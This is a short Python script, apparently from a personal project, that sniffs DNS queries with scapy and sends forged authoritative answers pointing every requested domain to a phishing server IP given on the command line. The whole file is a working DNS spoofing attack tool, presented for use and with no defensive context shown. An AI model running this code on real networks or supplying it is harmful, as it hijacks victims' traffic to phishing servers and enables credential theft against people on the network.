###################### DNS SPOOFING ########################

# More in README.md
# Author: Anthony KOUROGHLI (anthkrg)

##################### IMPORT WHAT WE NEED ###############

import argparse # argparse to get arguments
from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send



# --------------------- REDIRECTS PACKETS FUNCTION ------------------------

def redirect_packet(packet, phishing_ip):
    if packet.haslayer(DNSQR):
        print(f"DNS request captured : {packet[DNSQR].qname.decode()}")

        # Create response DNS to redirect to phishing server
        dns_response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                       UDP(sport=53, dport=packet[UDP].sport) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, \
                           an=DNSRR(rrname=packet[DNS].qd.name, ttl=10, rdata=phishing_ip))


        send(dns_response)
        print(f"Dns response sent ! Redirect to {phishing_ip}")

# ----------------------- FUNCTION TO CONFIGURE AND PARSE OPTIONS ----------------------

def parse_args():
    parser = argparse.ArgumentParser(description="Sniff and redirect DNS query to phishing server.")

    # Options to configure phishing server IP
    parser.add_argument("-i", "--phishing-ip", type=str, required=True,
                        help="IP address of the phishing server to redirects every DNS query.")

    return parser.parse_args()


# ------------------------ MAIN SCRIPT ---------------------------------

def main():

    args = parse_args()

    phishing_ip = args.phishing_ip

    sniff(filter="udp port 53", prn=lambda packet: redirect_packet(packet, phishing_ip), store=0)


if __name__ == "__main__":
    main()                        
    
